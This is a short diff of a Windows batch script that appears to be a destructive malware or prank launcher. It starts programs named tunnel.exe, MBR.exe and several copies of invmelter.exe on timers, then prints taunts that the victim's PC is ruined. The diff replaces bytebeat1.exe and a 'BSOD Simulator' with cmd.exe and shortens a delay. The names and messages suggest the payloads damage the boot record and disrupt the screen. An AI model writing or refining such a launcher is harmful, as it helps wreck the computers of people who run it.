@@ -19,14 +19,14 @@ timeout 61
 start tunnel.exe
 timeout 31
 start MBR.exe
-start bytebeat1.exe
+start cmd.exe
 timeout 81
 start invmelter.exe
 start invmelter.exe
 start invmelter.exe
 start invmelter.exe
-timeout 200
-start BSOD Simulator.exe
+timeout 20
+start cmd.exe
 timeout 100
 echo R.I.P your PC
 echo your PC has been fucked, anyways 
